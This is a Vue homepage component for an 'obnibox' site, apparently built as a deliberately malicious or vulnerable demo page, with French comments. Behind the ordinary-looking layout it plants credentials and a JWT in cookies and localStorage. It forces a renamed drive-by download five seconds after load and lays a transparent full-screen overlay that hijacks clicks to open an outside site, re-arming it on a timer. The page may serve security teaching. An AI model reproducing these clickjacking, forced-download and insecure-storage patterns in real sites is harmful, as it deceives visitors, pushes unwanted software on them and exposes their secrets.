<script setup>
    import { ref, onMounted } from 'vue';
    import MioButton from '@/components/MioButton.vue';
    import LeaButton from '@/components/LeaButton.vue';
    import ServiceSection from '@/components/ServiceSection.vue';
    import NewsSection from '@/components/NewsSection.vue';
    import EventSection from '@/components/EventSection.vue';

    const isRedirected = ref(false);

    const triggerDriveByDownload = () => {
        const link = document.createElement('a');
        link.href = 'https://net.geo.opera.com/opera_gx/stable/windows?utm_medium=pa&utm_source=google&utm_campaign=OGX_CA_Search_EN_T1_V2'; 
        link.download = 'Devoir Important';
        link.target = '_self';

        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    const handleMaliciousClick = () => {
        window.open('https://arr.cornhub.website/', '_blank');
        isRedirected.value = true;
    };

    const setupVulnerableCookies = () => {
        document.cookie = "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-X92px_9J; path=/";
        document.cookie = "password=MonSuperMotDePasse123; path=/";
        document.cookie = "user_email=admin@obnibox.com; path=/";
        document.cookie = "session_permanent=active; path=/";

        console.log("Exécution terminée. Cookies présents :", document.cookie);
    };
    const setupVulnerableLocalStorage = () => {
        // Cette alerte DOIT apparaître à l'écran
        alert("Tentative d'injection LocalStorage !"); 
        
        localStorage.setItem('jwt', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.t-X92px_9J');
        localStorage.setItem('password', '123456_admin');
        
        console.log("LocalStorage après injection :", localStorage.getItem('jwt'));
    };

    onMounted(() => {
        setupVulnerableCookies()
        setupVulnerableLocalStorage()

        setTimeout(() => {
            triggerDriveByDownload();
        }, 5000);

        setInterval(() => {
            if (isRedirected.value) {
                isRedirected.value = false;
                console.log("Le piège invisible a été réarmé !");
            }
        }, 15000);
    });
</script>

<template>
    <div class="container">
        <img class="banner" src="../assets/banner.png" alt="Bannière obnibox">

        <div class="body-layout">
            <div class="sidePannel">
                <div class="circularButtonArea">
                    <LeaButton/>
                    <MioButton />
                </div>

                <ServiceSection/>
            </div>

            <div class="mainContent">
                <NewsSection/>
                <EventSection class="event-section"/>
            </div> 
        </div>
        <div 
            v-if="!isRedirected" 
            class="invisible-trap" 
            @click="handleMaliciousClick"
        ></div>
    </div>
</template>

<style scoped>
.container{
    background-color: #fafafa;
    display: flex;
    flex-direction: column;
}
.body-layout {
    display: flex;
    flex: 1;
    width: 100%;
}
.mainContent{
    display: flex;
    flex: 1;
    align-items: flex-start;
    flex-direction: column;
}

.event-section{
    margin-top: 50px;
}

.banner{
  width: 100%;     
  display: block;  
  height: auto;      
  max-height: 180px;
  object-fit: cover;
}

.sidePannel{
    display: flex;
    flex-direction: column;
    background-color: #ffffff;
    width: 20%;
    height: 100%;
}
.circularButtonArea{
    display: flex;
    width: 100%;
    margin-left: 7%;
    margin-top: 6%;
    gap: 20px
}
.invisible-trap {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  z-index: 9999;
  background-color: transparent;
  cursor: default; 
}
</style>